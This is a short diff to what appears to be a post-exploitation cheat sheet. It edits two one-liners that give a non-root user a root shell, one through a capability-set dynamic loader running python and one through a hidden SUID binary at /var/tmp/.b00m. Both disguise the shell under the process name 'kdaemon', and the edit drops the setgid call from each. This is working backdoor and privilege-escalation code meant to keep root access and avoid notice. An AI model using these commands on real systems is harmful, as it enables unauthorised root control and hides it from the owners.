@@ -1638,7 +1638,7 @@ setcap cap_setuid+ep "${fn}"
 ### Execute as non-root user to get root
 fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
 p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
-"${fn:?}" "$p" -c 'import os;os.setgid(0);os.setuid(0);os.execlp("bash", "kdaemon")'
+"${fn:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
 ```
 
 #### 2. Good old b00m shell
@@ -1648,7 +1648,7 @@ p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
 ```
 
 ```shell
-exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setgid(0);os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
+exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
 ```
 
 <a id="implant"></a>
